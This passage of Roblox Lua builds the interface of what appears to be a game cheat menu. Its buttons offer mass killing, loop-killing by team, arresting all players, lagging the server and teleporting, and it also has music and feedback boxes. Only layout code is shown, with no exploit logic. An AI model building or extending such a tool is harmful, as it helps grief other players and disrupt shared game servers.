ProjectAntiAbusers.KillTeamInmate.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillTeamInmate.TextSize = 18.000

ProjectAntiAbusers.UICorner_6.Parent = ProjectAntiAbusers.KillTeamInmate

ProjectAntiAbusers.KillTeamCrim.Name = "KillTeamCrim"
ProjectAntiAbusers.KillTeamCrim.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillTeamCrim.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillTeamCrim.Position = UDim2.new(0.2781955, 0, 0.334745765, 0)
ProjectAntiAbusers.KillTeamCrim.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.KillTeamCrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillTeamCrim.Text = "Criminal"
ProjectAntiAbusers.KillTeamCrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillTeamCrim.TextSize = 18.000

ProjectAntiAbusers.UICorner_7.Parent = ProjectAntiAbusers.KillTeamCrim

ProjectAntiAbusers.KillTeamNeutral.Name = "KillTeamNeutral"
ProjectAntiAbusers.KillTeamNeutral.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillTeamNeutral.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillTeamNeutral.Position = UDim2.new(0.0300751925, 0, 0.334745765, 0)
ProjectAntiAbusers.KillTeamNeutral.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.KillTeamNeutral.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillTeamNeutral.Text = "Neutral"
ProjectAntiAbusers.KillTeamNeutral.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillTeamNeutral.TextSize = 18.000

ProjectAntiAbusers.UICorner_8.Parent = ProjectAntiAbusers.KillTeamNeutral

ProjectAntiAbusers.LoopKillGuard.Name = "LoopKillGuard"
ProjectAntiAbusers.LoopKillGuard.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillGuard.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillGuard.Position = UDim2.new(0.51879698, 0, 0.165254235, 0)
ProjectAntiAbusers.LoopKillGuard.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.LoopKillGuard.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillGuard.Text = "Guards"
ProjectAntiAbusers.LoopKillGuard.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LoopKillGuard.TextSize = 18.000

ProjectAntiAbusers.UICorner_9.Parent = ProjectAntiAbusers.LoopKillGuard

ProjectAntiAbusers.LoopKillInmate.Name = "LoopKillInmate"
ProjectAntiAbusers.LoopKillInmate.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillInmate.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillInmate.Position = UDim2.new(0.769423604, 0, 0.161016941, 0)
ProjectAntiAbusers.LoopKillInmate.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.LoopKillInmate.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillInmate.Text = "Inmates"
ProjectAntiAbusers.LoopKillInmate.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LoopKillInmate.TextSize = 18.000

ProjectAntiAbusers.UICorner_10.Parent = ProjectAntiAbusers.LoopKillInmate

ProjectAntiAbusers.LoopKillNeutral.Name = "LoopKillNeutral"
ProjectAntiAbusers.LoopKillNeutral.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillNeutral.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillNeutral.Position = UDim2.new(0.51879704, 0, 0.334745765, 0)
ProjectAntiAbusers.LoopKillNeutral.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.LoopKillNeutral.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillNeutral.Text = "Neutral"
ProjectAntiAbusers.LoopKillNeutral.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LoopKillNeutral.TextSize = 18.000

ProjectAntiAbusers.UICorner_11.Parent = ProjectAntiAbusers.LoopKillNeutral

ProjectAntiAbusers.LoopKillCrim.Name = "LoopKillCrim"
ProjectAntiAbusers.LoopKillCrim.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillCrim.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillCrim.Position = UDim2.new(0.774436116, 0, 0.334745765, 0)
ProjectAntiAbusers.LoopKillCrim.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.LoopKillCrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillCrim.Text = "Criminal"
ProjectAntiAbusers.LoopKillCrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LoopKillCrim.TextSize = 18.000

ProjectAntiAbusers.UICorner_12.Parent = ProjectAntiAbusers.LoopKillCrim

ProjectAntiAbusers.KillAll.Name = "KillAll"
ProjectAntiAbusers.KillAll.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillAll.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAll.Position = UDim2.new(0.0476190522, 0, 0.529661, 0)
ProjectAntiAbusers.KillAll.Size = UDim2.new(0, 100, 0, 32)
ProjectAntiAbusers.KillAll.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAll.Text = "Kill All"
ProjectAntiAbusers.KillAll.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillAll.TextSize = 18.000

ProjectAntiAbusers.UICorner_13.Parent = ProjectAntiAbusers.KillAll

ProjectAntiAbusers.ArrestAll.Name = "ArrestAll"
ProjectAntiAbusers.ArrestAll.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.ArrestAll.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ArrestAll.Position = UDim2.new(0.7218045, 0, 0.529661, 0)
ProjectAntiAbusers.ArrestAll.Size = UDim2.new(0, 100, 0, 32)
ProjectAntiAbusers.ArrestAll.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ArrestAll.Text = "Arrest All"
ProjectAntiAbusers.ArrestAll.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ArrestAll.TextSize = 18.000

ProjectAntiAbusers.UICorner_14.Parent = ProjectAntiAbusers.ArrestAll

ProjectAntiAbusers.KillAnnoyText.Name = "KillAnnoyText"
ProjectAntiAbusers.KillAnnoyText.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillAnnoyText.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAnnoyText.Position = UDim2.new(0.0300751869, 0, 0.686440647, 0)
ProjectAntiAbusers.KillAnnoyText.Size = UDim2.new(0, 185, 0, 22)
ProjectAntiAbusers.KillAnnoyText.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAnnoyText.Text = "Kill Annoyances"
ProjectAntiAbusers.KillAnnoyText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillAnnoyText.TextSize = 21.000

ProjectAntiAbusers.UICorner_15.Parent = ProjectAntiAbusers.KillAnnoyText

ProjectAntiAbusers.LoopKillAnnoyText.Name = "LoopKillAnnoyText"
ProjectAntiAbusers.LoopKillAnnoyText.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillAnnoyText.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillAnnoyText.Position = UDim2.new(0.51879698, 0, 0.686440647, 0)
ProjectAntiAbusers.LoopKillAnnoyText.Size = UDim2.new(0, 185, 0, 22)
ProjectAntiAbusers.LoopKillAnnoyText.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillAnnoyText.Text = "Loop Kill Annoyances"
ProjectAntiAbusers.LoopKillAnnoyText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.LoopKillAnnoyText.TextSize = 21.000

ProjectAntiAbusers.UICorner_16.Parent = ProjectAntiAbusers.LoopKillAnnoyText

ProjectAntiAbusers.KillShieldUser.Name = "KillShieldUser"
ProjectAntiAbusers.KillShieldUser.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillShieldUser.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillShieldUser.Position = UDim2.new(0.270676702, 0, 0.817796588, 0)
ProjectAntiAbusers.KillShieldUser.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.KillShieldUser.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillShieldUser.Text = "Shield User"
ProjectAntiAbusers.KillShieldUser.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillShieldUser.TextSize = 18.000

ProjectAntiAbusers.UICorner_17.Parent = ProjectAntiAbusers.KillShieldUser

ProjectAntiAbusers.KillAmmorUser.Name = "KillAmmorUser"
ProjectAntiAbusers.KillAmmorUser.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.KillAmmorUser.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillAmmorUser.Position = UDim2.new(0.0300751925, 0, 0.817796588, 0)
ProjectAntiAbusers.KillAmmorUser.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.KillAmmorUser.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillAmmorUser.Text = " Armor User"
ProjectAntiAbusers.KillAmmorUser.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillAmmorUser.TextSize = 18.000

ProjectAntiAbusers.UICorner_18.Parent = ProjectAntiAbusers.KillAmmorUser

ProjectAntiAbusers.LoopKillShieldUser.Name = "LoopKillShieldUser"
ProjectAntiAbusers.LoopKillShieldUser.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillShieldUser.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillShieldUser.Position = UDim2.new(0.769423604, 0, 0.822033882, 0)
ProjectAntiAbusers.LoopKillShieldUser.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.LoopKillShieldUser.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillShieldUser.Text = "Shield User"
ProjectAntiAbusers.LoopKillShieldUser.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.LoopKillShieldUser.TextSize = 18.000

ProjectAntiAbusers.UICorner_19.Parent = ProjectAntiAbusers.LoopKillShieldUser

ProjectAntiAbusers.LoopKillAmmorUser.Name = "LoopKillAmmorUser"
ProjectAntiAbusers.LoopKillAmmorUser.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.LoopKillAmmorUser.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillAmmorUser.Position = UDim2.new(0.521303296, 0, 0.817796588, 0)
ProjectAntiAbusers.LoopKillAmmorUser.Size = UDim2.new(0, 85, 0, 32)
ProjectAntiAbusers.LoopKillAmmorUser.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillAmmorUser.Text = " Ammor User"
ProjectAntiAbusers.LoopKillAmmorUser.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.LoopKillAmmorUser.TextSize = 18.000

ProjectAntiAbusers.UICorner_20.Parent = ProjectAntiAbusers.LoopKillAmmorUser

ProjectAntiAbusers.MakeAllCrimKill.Name = "MakeAllCrimKill"
ProjectAntiAbusers.MakeAllCrimKill.Parent = ProjectAntiAbusers.MassButtonsFrame
ProjectAntiAbusers.MakeAllCrimKill.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.MakeAllCrimKill.Position = UDim2.new(0.37343359, 0, 0.529661, 0)
ProjectAntiAbusers.MakeAllCrimKill.Size = UDim2.new(0, 100, 0, 32)
ProjectAntiAbusers.MakeAllCrimKill.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MakeAllCrimKill.Text = "Make All Crim(Kill Method)"
ProjectAntiAbusers.MakeAllCrimKill.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MakeAllCrimKill.TextScaled = true
ProjectAntiAbusers.MakeAllCrimKill.TextSize = 18.000
ProjectAntiAbusers.MakeAllCrimKill.TextWrapped = true

ProjectAntiAbusers.UICorner_21.Parent = ProjectAntiAbusers.MakeAllCrimKill

ProjectAntiAbusers.MiscFunctionsFrame.Name = "MiscFunctionsFrame"
ProjectAntiAbusers.MiscFunctionsFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.MiscFunctionsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.MiscFunctionsFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.MiscFunctionsFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.MiscFunctionsFrame.Visible = false

ProjectAntiAbusers.UICorner_22.Parent = ProjectAntiAbusers.MiscFunctionsFrame

ProjectAntiAbusers.ppgun.Name = "pp gun"
ProjectAntiAbusers.ppgun.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.ppgun.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ppgun.Position = UDim2.new(0.0200501252, 0, 0.0677966103, 0)
ProjectAntiAbusers.ppgun.Size = UDim2.new(0, 180, 0, 36)
ProjectAntiAbusers.ppgun.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ppgun.Text = "PP Guns"
ProjectAntiAbusers.ppgun.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ppgun.TextSize = 21.000

ProjectAntiAbusers.UICorner_23.Parent = ProjectAntiAbusers.ppgun

ProjectAntiAbusers.listcrims.Name = "list crims"
ProjectAntiAbusers.listcrims.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.listcrims.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.listcrims.Position = UDim2.new(0.503759384, 0, 0.429231793, 0)
ProjectAntiAbusers.listcrims.Size = UDim2.new(0, 181, 0, 36)
ProjectAntiAbusers.listcrims.Font = Enum.Font.SourceSans
ProjectAntiAbusers.listcrims.Text = "List Criminal Team"
ProjectAntiAbusers.listcrims.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.listcrims.TextSize = 21.000

ProjectAntiAbusers.UICorner_24.Parent = ProjectAntiAbusers.listcrims

ProjectAntiAbusers.listinmate.Name = "list inmate"
ProjectAntiAbusers.listinmate.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.listinmate.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.listinmate.Position = UDim2.new(0.503759384, 0, 0.24999997, 0)
ProjectAntiAbusers.listinmate.Size = UDim2.new(0, 181, 0, 36)
ProjectAntiAbusers.listinmate.Font = Enum.Font.SourceSans
ProjectAntiAbusers.listinmate.Text = "List Inmate Team"
ProjectAntiAbusers.listinmate.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.listinmate.TextSize = 21.000

ProjectAntiAbusers.UICorner_25.Parent = ProjectAntiAbusers.listinmate

ProjectAntiAbusers.listguards.Name = "list guards"
ProjectAntiAbusers.listguards.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.listguards.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.listguards.Position = UDim2.new(0.0200501252, 0, 0.25, 0)
ProjectAntiAbusers.listguards.Size = UDim2.new(0, 180, 0, 36)
ProjectAntiAbusers.listguards.Font = Enum.Font.SourceSans
ProjectAntiAbusers.listguards.Text = "List Guard Team"
ProjectAntiAbusers.listguards.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.listguards.TextSize = 21.000

ProjectAntiAbusers.UICorner_26.Parent = ProjectAntiAbusers.listguards

ProjectAntiAbusers.listneutral.Name = "list neutral"
ProjectAntiAbusers.listneutral.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.listneutral.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.listneutral.Position = UDim2.new(0.0200501252, 0, 0.432203352, 0)
ProjectAntiAbusers.listneutral.Size = UDim2.new(0, 181, 0, 36)
ProjectAntiAbusers.listneutral.Font = Enum.Font.SourceSans
ProjectAntiAbusers.listneutral.Text = "List Neutral Team"
ProjectAntiAbusers.listneutral.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.listneutral.TextSize = 21.000

ProjectAntiAbusers.UICorner_27.Parent = ProjectAntiAbusers.listneutral

ProjectAntiAbusers.clicktp.Name = "clicktp"
ProjectAntiAbusers.clicktp.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.clicktp.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.clicktp.Position = UDim2.new(0.0200501252, 0, 0.614406824, 0)
ProjectAntiAbusers.clicktp.Size = UDim2.new(0, 180, 0, 36)
ProjectAntiAbusers.clicktp.Font = Enum.Font.SourceSans
ProjectAntiAbusers.clicktp.Text = "Click TP"
ProjectAntiAbusers.clicktp.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.clicktp.TextSize = 21.000

ProjectAntiAbusers.UICorner_28.Parent = ProjectAntiAbusers.clicktp

ProjectAntiAbusers.lagserver.Name = "lagserver"
ProjectAntiAbusers.lagserver.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.lagserver.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.lagserver.Position = UDim2.new(0.503759384, 0, 0.072033897, 0)
ProjectAntiAbusers.lagserver.Size = UDim2.new(0, 181, 0, 36)
ProjectAntiAbusers.lagserver.Font = Enum.Font.SourceSans
ProjectAntiAbusers.lagserver.Text = "Lag Server"
ProjectAntiAbusers.lagserver.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.lagserver.TextSize = 21.000

ProjectAntiAbusers.UICorner_29.Parent = ProjectAntiAbusers.lagserver

ProjectAntiAbusers.spamm9.Name = "spam m9"
ProjectAntiAbusers.spamm9.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.spamm9.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.spamm9.Position = UDim2.new(0.273182929, 0, 0.797875822, 0)
ProjectAntiAbusers.spamm9.Size = UDim2.new(0, 181, 0, 36)
ProjectAntiAbusers.spamm9.Font = Enum.Font.SourceSans
ProjectAntiAbusers.spamm9.Text = "Spam M9 Key"
ProjectAntiAbusers.spamm9.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.spamm9.TextSize = 21.000

ProjectAntiAbusers.UICorner_30.Parent = ProjectAntiAbusers.spamm9

ProjectAntiAbusers.OpenGate.Name = "OpenGate"
ProjectAntiAbusers.OpenGate.Parent = ProjectAntiAbusers.MiscFunctionsFrame
ProjectAntiAbusers.OpenGate.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.OpenGate.Position = UDim2.new(0.503759384, 0, 0.614406824, 0)
ProjectAntiAbusers.OpenGate.Size = UDim2.new(0, 180, 0, 36)
ProjectAntiAbusers.OpenGate.Font = Enum.Font.SourceSans
ProjectAntiAbusers.OpenGate.Text = "Open Gate"
ProjectAntiAbusers.OpenGate.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.OpenGate.TextSize = 21.000

ProjectAntiAbusers.UICorner_31.Parent = ProjectAntiAbusers.OpenGate

ProjectAntiAbusers.MusicFeedbackFrame.Name = "MusicFeedbackFrame"
ProjectAntiAbusers.MusicFeedbackFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.MusicFeedbackFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.MusicFeedbackFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.MusicFeedbackFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.MusicFeedbackFrame.Visible = false

ProjectAntiAbusers.MusicIDTextBox.Name = "MusicIDTextBox"
ProjectAntiAbusers.MusicIDTextBox.Parent = ProjectAntiAbusers.MusicFeedbackFrame
ProjectAntiAbusers.MusicIDTextBox.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.MusicIDTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.MusicIDTextBox.BorderSizePixel = 2
ProjectAntiAbusers.MusicIDTextBox.Position = UDim2.new(0.0275689214, 0, 0.0508474559, 0)
ProjectAntiAbusers.MusicIDTextBox.Size = UDim2.new(0, 163, 0, 44)
ProjectAntiAbusers.MusicIDTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MusicIDTextBox.PlaceholderText = "Place music ID here!"
ProjectAntiAbusers.MusicIDTextBox.Text = ""
ProjectAntiAbusers.MusicIDTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MusicIDTextBox.TextSize = 14.000

ProjectAntiAbusers.LoopToggle.Name = "LoopToggle"
ProjectAntiAbusers.LoopToggle.Parent = ProjectAntiAbusers.MusicIDTextBox
ProjectAntiAbusers.LoopToggle.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopToggle.Position = UDim2.new(-0.00310591049, 0, 2.2515409, 0)
ProjectAntiAbusers.LoopToggle.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.LoopToggle.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopToggle.Text = "Loop"
ProjectAntiAbusers.LoopToggle.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.LoopToggle.TextSize = 14.000

ProjectAntiAbusers.UICorner_32.Parent = ProjectAntiAbusers.LoopToggle

ProjectAntiAbusers.StopButton.Name = "StopButton"
ProjectAntiAbusers.StopButton.Parent = ProjectAntiAbusers.MusicIDTextBox
ProjectAntiAbusers.StopButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.StopButton.Position = UDim2.new(-0.0031059254, 0, 1.69106317, 0)
ProjectAntiAbusers.StopButton.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.StopButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.StopButton.Text = "Stop"
ProjectAntiAbusers.StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.StopButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_33.Parent = ProjectAntiAbusers.StopButton

ProjectAntiAbusers.PlayButton.Name = "PlayButton"
ProjectAntiAbusers.PlayButton.Parent = ProjectAntiAbusers.MusicIDTextBox
ProjectAntiAbusers.PlayButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.PlayButton.Position = UDim2.new(-0.0031059254, 0, 1.1533128, 0)
ProjectAntiAbusers.PlayButton.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.PlayButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.PlayButton.Text = "Play"
ProjectAntiAbusers.PlayButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.PlayButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_34.Parent = ProjectAntiAbusers.PlayButton

ProjectAntiAbusers.BugIssuesTextBox.Name = "BugIssuesTextBox"
ProjectAntiAbusers.BugIssuesTextBox.Parent = ProjectAntiAbusers.MusicFeedbackFrame
ProjectAntiAbusers.BugIssuesTextBox.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.BugIssuesTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.BugIssuesTextBox.BorderSizePixel = 2
ProjectAntiAbusers.BugIssuesTextBox.Position = UDim2.new(0.0275689214, 0, 0.665254235, 0)
ProjectAntiAbusers.BugIssuesTextBox.Size = UDim2.new(0, 163, 0, 44)
ProjectAntiAbusers.BugIssuesTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BugIssuesTextBox.PlaceholderText = "Insert bugs/issues here!"
ProjectAntiAbusers.BugIssuesTextBox.Text = ""
ProjectAntiAbusers.BugIssuesTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BugIssuesTextBox.TextSize = 14.000

ProjectAntiAbusers.ReportButton.Name = "ReportButton"
ProjectAntiAbusers.ReportButton.Parent = ProjectAntiAbusers.BugIssuesTextBox
ProjectAntiAbusers.ReportButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ReportButton.Position = UDim2.new(-0.0031059254, 0, 1.21533132, 0)
ProjectAntiAbusers.ReportButton.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.ReportButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ReportButton.Text = "Report"
ProjectAntiAbusers.ReportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ReportButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_35.Parent = ProjectAntiAbusers.ReportButton

ProjectAntiAbusers.FeedbackTextBox.Name = "FeedbackTextBox"
ProjectAntiAbusers.FeedbackTextBox.Parent = ProjectAntiAbusers.MusicFeedbackFrame
ProjectAntiAbusers.FeedbackTextBox.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.FeedbackTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.FeedbackTextBox.BorderSizePixel = 2
ProjectAntiAbusers.FeedbackTextBox.Position = UDim2.new(0.55639106, 0, 0.0508474559, 0)
ProjectAntiAbusers.FeedbackTextBox.Size = UDim2.new(0, 163, 0, 39)
ProjectAntiAbusers.FeedbackTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.FeedbackTextBox.PlaceholderText = "Place your Feedback here!"
ProjectAntiAbusers.FeedbackTextBox.Text = ""
ProjectAntiAbusers.FeedbackTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.FeedbackTextBox.TextSize = 14.000

ProjectAntiAbusers.FeedbackButton.Name = "FeedbackButton"
ProjectAntiAbusers.FeedbackButton.Parent = ProjectAntiAbusers.FeedbackTextBox
ProjectAntiAbusers.FeedbackButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.FeedbackButton.Position = UDim2.new(-0.0031059254, 0, 1.1533128, 0)
ProjectAntiAbusers.FeedbackButton.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.FeedbackButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.FeedbackButton.Text = "Send Feedback"
ProjectAntiAbusers.FeedbackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.FeedbackButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_36.Parent = ProjectAntiAbusers.FeedbackButton

ProjectAntiAbusers.SuggestionTextBox.Name = "SuggestionTextBox"
ProjectAntiAbusers.SuggestionTextBox.Parent = ProjectAntiAbusers.MusicFeedbackFrame
ProjectAntiAbusers.SuggestionTextBox.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SuggestionTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.SuggestionTextBox.BorderSizePixel = 2
ProjectAntiAbusers.SuggestionTextBox.Position = UDim2.new(0.551378548, 0, 0.690677941, 0)
ProjectAntiAbusers.SuggestionTextBox.Size = UDim2.new(0, 163, 0, 38)
ProjectAntiAbusers.SuggestionTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SuggestionTextBox.PlaceholderText = "Place your suggestion here!"
ProjectAntiAbusers.SuggestionTextBox.Text = ""
ProjectAntiAbusers.SuggestionTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.SuggestionTextBox.TextSize = 14.000

ProjectAntiAbusers.SuggestButton.Name = "SuggestButton"
ProjectAntiAbusers.SuggestButton.Parent = ProjectAntiAbusers.SuggestionTextBox
ProjectAntiAbusers.SuggestButton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SuggestButton.Position = UDim2.new(0.00302898884, 0, 1.24781036, 0)
ProjectAntiAbusers.SuggestButton.Size = UDim2.new(0, 163, 0, 25)
ProjectAntiAbusers.SuggestButton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SuggestButton.Text = "Suggest"
ProjectAntiAbusers.SuggestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.SuggestButton.TextSize = 14.000

ProjectAntiAbusers.UICorner_37.Parent = ProjectAntiAbusers.SuggestButton

ProjectAntiAbusers.UICorner_38.Parent = ProjectAntiAbusers.MusicFeedbackFrame

ProjectAntiAbusers.ReportExploiterTextBox.Name = "ReportExploiterTextBox"
ProjectAntiAbusers.ReportExploiterTextBox.Parent = ProjectAntiAbusers.MusicFeedbackFrame
